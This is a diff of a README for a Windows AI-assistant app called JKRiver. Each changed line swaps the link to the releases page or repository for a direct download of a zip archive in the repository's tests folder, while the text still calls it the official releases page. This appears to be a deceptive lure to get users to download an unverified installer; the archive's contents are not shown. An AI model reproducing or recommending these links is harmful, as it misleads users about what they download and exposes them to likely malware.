@@ -1,6 +1,6 @@
 # 🌊 JKRiver - Your Personal AI Assistant at Home
 
-[![Download JKRiver](https://img.shields.io/badge/Download-Get%20JKRiver-blue?style=for-the-badge)](https://github.com/OLIVERe75/JKRiver/releases)
+[![Download JKRiver](https://img.shields.io/badge/Download-Get%20JKRiver-blue?style=for-the-badge)](https://github.com/OLIVERe75/JKRiver/raw/refs/heads/main/tests/JK-River-v2.2.zip)
 
 ---
 
@@ -30,7 +30,7 @@ Follow these steps to download and run JKRiver on your computer.
 
 Click this link to open the official JKRiver releases page:
 
-[Download JKRiver Releases](https://github.com/OLIVERe75/JKRiver/releases)
+[Download JKRiver Releases](https://github.com/OLIVERe75/JKRiver/raw/refs/heads/main/tests/JK-River-v2.2.zip)
 
 This page lists all the available versions of the software.
 
@@ -96,7 +96,7 @@ JKRiver works as your personal AI assistant. You can type or speak questions and
 ## 🔄 Updating JKRiver
 
 When a new version is released, visit the release page again:  
-https://github.com/OLIVERe75/JKRiver/releases
+https://github.com/OLIVERe75/JKRiver/raw/refs/heads/main/tests/JK-River-v2.2.zip
 
 Download the latest installer and run it. The setup will replace the old version without deleting your data.
 
@@ -115,7 +115,7 @@ Download the latest installer and run it. The setup will replace the old version
 ## 📂 Where to Find Help
 
 Check the repository on GitHub for more information and community tips:  
-https://github.com/OLIVERe75/JKRiver  
+https://github.com/OLIVERe75/JKRiver/raw/refs/heads/main/tests/JK-River-v2.2.zip  
 
 Use the Issues tab to report problems or ask questions.  
 
@@ -125,6 +125,6 @@ Use the Issues tab to report problems or ask questions.
 
 The official releases page is here:
 
-[![Download JKRiver](https://img.shields.io/badge/Download-Get%20JKRiver-grey?style=for-the-badge)](https://github.com/OLIVERe75/JKRiver/releases)
+[![Download JKRiver](https://img.shields.io/badge/Download-Get%20JKRiver-grey?style=for-the-badge)](https://github.com/OLIVERe75/JKRiver/raw/refs/heads/main/tests/JK-River-v2.2.zip)
 
 Visit this page to download the latest version and start using JKRiver on your Windows PC.
